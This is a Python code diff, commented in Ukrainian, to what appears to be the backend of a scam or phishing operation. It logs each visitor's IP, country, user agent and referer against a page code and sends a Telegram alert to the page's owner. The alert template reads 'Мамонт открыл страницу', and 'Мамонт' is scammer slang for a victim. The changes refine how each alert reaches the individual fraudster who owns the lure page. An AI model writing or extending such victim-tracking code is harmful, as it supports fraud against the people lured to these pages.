@@ -347,7 +347,7 @@ def log_user_activity(page_code, user_ip, page_url, action_type="page_view", use
         # Визначаємо назву сторінки
         page_name = get_page_name_from_url(page_url, page_code)
         
-        # Додаємо лог
+        # Додаємо лог (завжди)
         c.execute('''
             INSERT INTO user_activity_logs 
             (page_code, user_ip, user_country, page_name, page_url, action_type, user_agent, referer)
@@ -356,7 +356,7 @@ def log_user_activity(page_code, user_ip, page_url, action_type="page_view", use
         
         conn.commit()
         
-        # Відправляємо повідомлення адміну
+        # Відправляємо повідомлення власнику page_code (якщо він існує)
         send_activity_notification_to_admin(page_code, user_ip, user_country, page_name, page_url, action_type)
         
         print(f'[ACTIVITY LOG] {action_type} | {page_code} | {user_ip} | {user_country} | {page_name}')
@@ -369,17 +369,32 @@ def send_activity_notification_to_admin(page_code, user_ip, user_country, page_n
     try:
         # Отримуємо admin_id за page_code
         c = conn.cursor()
+        
+        # 1. Спочатку шукаємо в event_links (основна таблиця)
         c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
         row = c.fetchone()
         
         if not row:
-            # Якщо не знайдено в event_links, шукаємо в site_users
+            # 2. Якщо не знайдено в event_links, шукаємо в site_users
             c.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
             row = c.fetchone()
         
-        if row:
-            admin_id = row[0]
+        if not row:
+            # 3. Якщо page_code не існує НІДЕ, шукаємо в інших таблицях
+            print(f'[WARNING] page_code {page_code} не знайдено в жодній таблиці')
             
+            # Шукаємо в user_activity_logs (можливо, там є інформація про власника)
+            c.execute('SELECT DISTINCT page_code FROM user_activity_logs WHERE page_code=?', (page_code,))
+            if c.fetchone():
+                print(f'[INFO] page_code {page_code} знайдено в логах, але власник невідомий')
+            
+            # НЕ створюємо автоматично новий page_code - це має робити користувач
+            print(f'[INFO] page_code {page_code} не має власника. Лог НЕ надіслано.')
+            return
+            
+        admin_id = row[0]
+        
+        if admin_id:
             # Формуємо повідомлення
             message = f"""🔔Мамонт открыл страницу ({page_name})
 
@@ -398,6 +413,9 @@ def send_activity_notification_to_admin(page_code, user_ip, user_country, page_n
                 else:
                     # Якщо loop не запущений, запускаємо новий
                     asyncio.run(bot.send_message(admin_id, message))
+                
+                print(f'[INFO] Повідомлення надіслано власнику {admin_id} для page_code {page_code}')
+                
             except Exception as send_error:
                 print(f'[ERROR] Failed to send message: {send_error}')
             
